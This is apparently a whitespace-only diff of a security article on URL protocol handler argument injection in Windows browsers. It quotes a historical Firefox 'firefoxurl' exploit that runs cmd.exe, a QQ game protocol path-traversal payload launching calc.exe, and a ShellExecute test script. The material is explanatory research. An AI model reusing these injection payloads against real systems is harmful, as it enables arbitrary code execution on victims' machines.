@@ -23,18 +23,18 @@ Custom url protocol is a common feature in Windows and macOS. On Windows, these 
 For example, to associate alert: protocol to alert.exe, create following registry keys:
 
 ```
-HKEY_CLASSES_ROOT  
- alert  
- (Default) = "URL:Alert Protocol"  
- URL Protocol = ""  
- DefaultIcon  
- (Default) = "alert.exe,1"  
- shell  
- open  
- command  
+HKEY_CLASSES_ROOT
+ alert
+ (Default) = "URL:Alert Protocol"
+ URL Protocol = ""
+ DefaultIcon
+ (Default) = "alert.exe,1"
+ shell
+ open
+ command
  (Default) = "C:\Program Files\Alert\alert.exe" "%1"
 ```
- 
+
 The *%1* placeholder will be replaced with arguments from url. It is quoted incase there's a space or something that confuses CommandLineToArgvW, mistakenly split the filename or something else into multiple parts.
 
 But there's a serious problem, even MSDN has warned clearly: [Security Issues](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx#prot_sec)
@@ -61,38 +61,38 @@ Let's see how Chromium itself mitigate the issue: add a double dash switch befor
 ```
 InternetExplorer 11
 
-Breakpoint 3 hit  
-SHELL32!ShellExecuteExW:  
-00007ffc`6fad0ff0 48895c2408 mov qword ptr [rsp+8],rbx ss:00000072`e9eff790=0000000000000000  
-0:019> k  
- # Child-SP RetAddr Call Site  
-00 00000072`e9eff788 00007ffc`4b4e34fc SHELL32!ShellExecuteExW  
-01 00000072`e9eff790 00007ffc`4b1f3466 IEFRAME!CShellExecWithHandlerParams::Execute+0xbc  
+Breakpoint 3 hit
+SHELL32!ShellExecuteExW:
+00007ffc`6fad0ff0 48895c2408 mov qword ptr [rsp+8],rbx ss:00000072`e9eff790=0000000000000000
+0:019> k
+ # Child-SP RetAddr Call Site
+00 00000072`e9eff788 00007ffc`4b4e34fc SHELL32!ShellExecuteExW
+01 00000072`e9eff790 00007ffc`4b1f3466 IEFRAME!CShellExecWithHandlerParams::Execute+0xbc
 02 00000072`e9eff840 00007ffc`6e7dd544 IEFRAME!BrokerShellExecWithHandlerThreadProc+0x146Chromium
 ```
 
 [https://cs.chromium.org/chromium/src/chrome/browser/platform_util_win.cc?type=cs&sq=package:chromium&l=101](https://cs.chromium.org/chromium/src/chrome/browser/platform_util_win.cc?type=cs&sq=package:chromium&l=101)
 
 ```cpp
-if (reinterpret_cast<ULONG_PTR>(ShellExecuteA(NULL, "open",  
- escaped_url.c_str(), NULL, NULL,  
+if (reinterpret_cast<ULONG_PTR>(ShellExecuteA(NULL, "open",
+ escaped_url.c_str(), NULL, NULL,
  SW_SHOWNORMAL)) <= 32) {Edge is an UWP app, which calls SHELL32!CDefFolderMenu::InvokeCommand
 ```
 
 ```
-KERNEL32!CreateProcessWStub:  
-00007ffc`6ecae490 4c8bdc mov r11,rsp  
-0:007> k  
- # Child-SP RetAddr Call Site  
-00 00000018`474fe0b8 00007ffc`6d81b0f7 KERNEL32!CreateProcessWStub  
-......  
-0e 00000018`474fee30 00007ffc`568c2ad7 SHELL32!CDefFolderMenu::InvokeCommand+0x13e  
-0f 00000018`474ff1a0 00007ffc`565fca55 twinui!CExecuteItem::Execute+0x1ab [onecoreuap\shell\lib\executeitem\executeitem.cpp @ 351]   
-10 00000018`474ff220 00007ffc`565fa5c8 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchShellItemWithOptionsAndVerb+0x19d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2352]  
-11 00000018`474ff3a0 00007ffc`565fcef8 twinui!CBrokeredLauncher::CLaunchHelper::_ExecuteItem+0x28 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2308]  
-12 00000018`474ff3e0 00007ffc`565fa046 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchWithWarning+0x3c8 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2267]  
-13 00000018`474ff490 00007ffc`565fa3c1 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunch+0x3e [shell\twinui\associationlaunch\lib\launcher.cpp @ 2210]   
-14 00000018`474ff4c0 00007ffc`565f48a4 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunchOrFallback+0x32d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2064]  
+KERNEL32!CreateProcessWStub:
+00007ffc`6ecae490 4c8bdc mov r11,rsp
+0:007> k
+ # Child-SP RetAddr Call Site
+00 00000018`474fe0b8 00007ffc`6d81b0f7 KERNEL32!CreateProcessWStub
+......
+0e 00000018`474fee30 00007ffc`568c2ad7 SHELL32!CDefFolderMenu::InvokeCommand+0x13e
+0f 00000018`474ff1a0 00007ffc`565fca55 twinui!CExecuteItem::Execute+0x1ab [onecoreuap\shell\lib\executeitem\executeitem.cpp @ 351]
+10 00000018`474ff220 00007ffc`565fa5c8 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchShellItemWithOptionsAndVerb+0x19d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2352]
+11 00000018`474ff3a0 00007ffc`565fcef8 twinui!CBrokeredLauncher::CLaunchHelper::_ExecuteItem+0x28 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2308]
+12 00000018`474ff3e0 00007ffc`565fa046 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchWithWarning+0x3c8 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2267]
+13 00000018`474ff490 00007ffc`565fa3c1 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunch+0x3e [shell\twinui\associationlaunch\lib\launcher.cpp @ 2210]
+14 00000018`474ff4c0 00007ffc`565f48a4 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunchOrFallback+0x32d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2064]
 15 00000018`474ff580 00007ffc`565ee094 twinui!CBrokeredLauncher::CLaunchHelper::LaunchUri+0xd0 [shell\twinui\associationlaunch\lib\launcher.cpp @ 1084]
 ```
 
@@ -145,7 +145,7 @@ This is a argument injection affects both Firefox and ThunderBird.
 Firefox registered `FirefoxURL` protocol:
 
 ```
-[HKEY_CLASSES_ROOT\FirefoxURL\shell\open\command\@]  
+[HKEY_CLASSES_ROOT\FirefoxURL\shell\open\command\@]
 C:\\PROGRA~1\\MOZILL~2\\FIREFOX.EXE -url "%1″ -requestPending
 ```
 
@@ -162,16 +162,16 @@ So he used a special switch -chrome which allows executing arbitrary javascript 
 His final exploit:
 
 ```html
-<html><body>  
-<iframe src='firefoxurl://larholm.com" -chrome "javascript:C=Components.classes;I=Components.interfaces;  
-file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);  
-file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+  
-String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+  
-String.fromCharCode(92)+'cmd.exe');  
-process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);  
-process.init(file);  
-process.run(true,['/k%20echo%20hello%20from%20larholm.com'],1);  
-'><  
+<html><body>
+<iframe src='firefoxurl://larholm.com" -chrome "javascript:C=Components.classes;I=Components.interfaces;
+file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);
+file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+
+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+
+String.fromCharCode(92)+'cmd.exe');
+process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);
+process.init(file);
+process.run(true,['/k%20echo%20hello%20from%20larholm.com'],1);
+'><
 </body></html>
 ```
 
@@ -214,8 +214,8 @@ An explorer window will show up.
 BTW, if you want to test the quirk of ShellExecuteEx, the following jscript works:
 
 ```js
-var objShell = new ActiveXObject("shell.application");  
-WScript.Echo("Attach me...");  
+var objShell = new ActiveXObject("shell.application");
+WScript.Echo("Attach me...");
 objShell.ShellExecute("www.baidu.com..\\..\\", "", "", "open", 1);
 ```
 
@@ -226,7 +226,7 @@ In the talk [Attack Surface Extended by URL Schemes](https://conference.hitb.org
 The exploit:
 
 ```
-qqgameprotocol://shortcut/# URL=c:/windows/system32/http://qq.com/../../calc.exe ICON=3366xs.ico NAME=AAAAAAAA  
+qqgameprotocol://shortcut/# URL=c:/windows/system32/http://qq.com/../../calc.exe ICON=3366xs.ico NAME=AAAAAAAA
 DESC=BBBBB TYPE=1 START=1
 ```
 
@@ -248,17 +248,17 @@ Here's my modified version:
 
 ```objectivec
 /*
- to compile: clang -fmodules schemes.m -o schemes  
- then run `./schemes`  
-*/  
-  
-#import <Foundation/Foundation.h>  
-#import <AppKit/AppKit.h>  
-  
-extern OSStatus _LSCopySchemesAndHandlerURLs(CFArrayRef *outSchemes, CFArrayRef *outApps);  
-extern OSStatus _LSCopyAllApplicationURLs(CFArrayRef *theList);  
+ to compile: clang -fmodules schemes.m -o schemes
+ then run `./schemes`
+*/
 
-int main(int argc, const char * argv[]) {  
+#import <Foundation/Foundation.h>
+#import <AppKit/AppKit.h>
+
+extern OSStatus _LSCopySchemesAndHandlerURLs(CFArrayRef *outSchemes, CFArrayRef *outApps);
+extern OSStatus _LSCopyAllApplicationURLs(CFArrayRef *theList);
+
+int main(int argc, const char * argv[]) {
   @autoreleasepool {
     CFArrayRef schemes;
     CFArrayRef apps;
@@ -271,12 +271,12 @@ int main(int argc, const char * argv[]) {
 
       for (CFIndex j = 0, bundle_count = CFArrayGetCount(handlers); j < bundle_count; j++) {
         CFStringRef handler = CFArrayGetValueAtIndex(handlers, j);
-        NSLog(@"\t%@ (%@)", handler, [workspace absolutePathForAppBundleWithIdentifier:(__bridge NSString *)handler]);  
-      }  
-    }  
-    NSLog(@"\n");  
+        NSLog(@"\t%@ (%@)", handler, [workspace absolutePathForAppBundleWithIdentifier:(__bridge NSString *)handler]);
+      }
+    }
+    NSLog(@"\n");
   }
-  return 0;  
+  return 0;
 }
 ```
 
@@ -288,12 +288,11 @@ You can see many interesting protocols in the list. Will there be any new bug to
 
 ### References
 
-[1]. [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx)  
-[2]. [About Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774%28v=vs.85%29.aspx)  
-[3]. [Microsoft Security Bulletin MS07–061 — Critical](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2007/ms07-061)  
-[4]. <https://www.trendmicro.com/vinfo/id/threat-encyclopedia/vulnerability/920/multiple-browser-uri-handlers-command-injection-vulnerabilities>  
-[5]. [Microsoft Security Bulletin MS10–007 — Critical](https://technet.microsoft.com/library/security/ms10-007)  
-[6]. [URI Use and Abuse](https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf)  
+[1]. [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx)
+[2]. [About Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774%28v=vs.85%29.aspx)
+[3]. [Microsoft Security Bulletin MS07–061 — Critical](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2007/ms07-061)
+[4]. <https://www.trendmicro.com/vinfo/id/threat-encyclopedia/vulnerability/920/multiple-browser-uri-handlers-command-injection-vulnerabilities>
+[5]. [Microsoft Security Bulletin MS10–007 — Critical](https://technet.microsoft.com/library/security/ms10-007)
+[6]. [URI Use and Abuse](https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf)
 [7]. [Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf)
 
-  
